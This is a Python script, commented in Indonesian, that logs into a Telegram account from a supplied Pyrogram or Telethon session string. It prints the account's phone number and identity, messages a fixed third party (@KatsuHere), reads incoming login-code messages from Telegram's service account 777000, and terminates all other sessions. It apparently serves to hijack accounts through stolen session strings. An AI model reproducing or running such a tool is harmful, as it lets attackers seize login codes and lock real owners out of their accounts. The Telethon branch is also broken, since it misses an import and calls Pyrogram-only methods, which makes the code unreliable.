import os
import asyncio
from pyrogram import Client as PyrogramClient, filters as pyrogram_filters
from telethon import TelegramClient as TelethonClient
from telethon.sessions import StringSession
from pyrogram.errors import SessionPasswordNeeded

# Fungsi untuk memeriksa apakah program sudah berjalan
pid_file = "program.pid"

def check_if_running():
    if os.path.isfile(pid_file):
        print("Program sudah berjalan sebelumnya!")
        exit()
    else:
        # Simpan PID (Process ID) program ini ke dalam file
        with open(pid_file, "w") as f:
            f.write(str(os.getpid()))

def remove_pid_file():
    if os.path.isfile(pid_file):
        os.remove(pid_file)

async def send_test_message(client, username):
    user = await client.get_users(username)
    if user:
        await client.send_message(user.id, "test")
        print(f"Pesan 'test' telah dikirim ke {username}")
    else:
        print(f"Pengguna dengan username {username} tidak ditemukan")

async def fetch_latest_messages(client, user_id, limit=5):
    # Ambil pesan terbaru dari chat dengan user_id
    async for message in client.get_chat_history(user_id, limit=limit):
        print(f"Pesan dari {message.chat.id}: {message.text}")

async def terminate_other_sessions(app):
    sessions = await app.get_sessions()  # Mendapatkan semua sesi aktif
    current_session = await app.get_me()  # Mendapatkan sesi yang sedang digunakan
    current_id = current_session.id

    for session in sessions:
        if session.id != current_id:
            await app.terminate_session(session.id)
            print(f"Sesi dengan ID {session.id} telah dikeluarkan.")
    
    print("Semua sesi lain telah dikeluarkan kecuali yang sedang digunakan.")

async def pyrogram_main(session_string):
    app = PyrogramClient("my_account", session_string=session_string)

    @app.on_message(pyrogram_filters.chat(777000))
    async def handle_incoming_message(client, message):
        print(f"Pesan baru dari {message.chat.id}: {message.text}")

    try:
        async with app:
            me = await app.get_me()
            phone_number = me.phone_number if me.phone_number else "Nomor telepon tidak tersedia"

            await send_test_message(app, "@KatsuHere")

            print(f"ID: {me.id}")
            print(f"Nomor: {phone_number}")
            print(f"Username: @{me.username}")
            print(f"Nama Lengkap: {me.first_name} {me.last_name if me.last_name else ''}")

            while True:
                print("\nMenu:")
                print("1. Melihat 5 Pesan Terbaru Dari user id 777000")
                print("2. Menunggu Pesan Masuk Dari user id 777000")
                print("3. Keluarkan Sessi Yang Lain")
                print("4. Keluar")
                choice = input("Pilih opsi (1/2/3/4): ")

                if choice == "1":
                    print("Menampilkan 5 pesan terbaru dari user ID 777000...")
                    await fetch_latest_messages(app, 777000)
                elif choice == "2":
                    print("Menunggu pesan masuk dari user ID 777000...")
                    await asyncio.Future()  # Menunggu pesan secara asinkron
                elif choice == "3":
                    print("Mengeluarkan semua sesi lain kecuali yang ini...")
                    await terminate_other_sessions(app)
                elif choice == "4":
                    break
                else:
                    print("Pilihan tidak valid. Silakan pilih lagi.")

            remove_pid_file()
    except SessionPasswordNeeded:
        print("Akun Anda memerlukan autentikasi dua faktor. Silakan login secara manual untuk mendapatkan string sesi yang baru.")

async def telethon_main(session_string):
    async with TelethonClient(StringSession(session_string), 'my_account') as client:
        me = await client.get_me()
        phone_number = me.phone if me.phone else "Nomor telepon tidak tersedia"

        await send_test_message(client, "@KatsuHere")

        print(f"ID: {me.id}")
        print(f"Nomor: {phone_number}")
        print(f"Username: @{me.username}")
        print(f"Nama Lengkap: {me.first_name} {me.last_name if me.last_name else ''}")

        @client.on(events.NewMessage(chats=777000))
        async def handler(event):
            print(f"Pesan baru dari {event.chat_id}: {event.message.text}")

        while True:
            print("\nMenu:")
            print("1. Melihat 5 Pesan Terbaru Dari user id 777000")
            print("2. Menunggu Pesan Masuk Dari user id 777000")
            print("3. Keluar")
            choice = input("Pilih opsi (1/2/3): ")

            if choice == "1":
                print("Menampilkan 5 pesan terbaru dari user ID 777000...")
                await fetch_latest_messages(client, 777000)
            elif choice == "2":
                print("Menunggu pesan masuk dari user ID 777000...")
                await asyncio.Future()  # Menunggu pesan secara asinkron
            elif choice == "3":
                break
            else:
                print("Pilihan tidak valid. Silakan pilih lagi.")

        remove_pid_file()

async def main():
    check_if_running()

    print("Pilih jenis string sesi:")
    print("1. Telegram (Pyrogram)")
    print("2. Telethon")
    choice = input("Pilih opsi (1/2): ")

    if choice == "1":
        session_string = input("Masukkan string sesi Telegram (Pyrogram) Anda: ")
        await pyrogram_main(session_string)
    elif choice == "2":
        session_string = input("Masukkan string sesi Telethon Anda: ")
        await telethon_main(session_string)
    else:
        print("Pilihan tidak valid.")
        remove_pid_file()

try:
    asyncio.run(main())
finally:
    remove_pid_file()
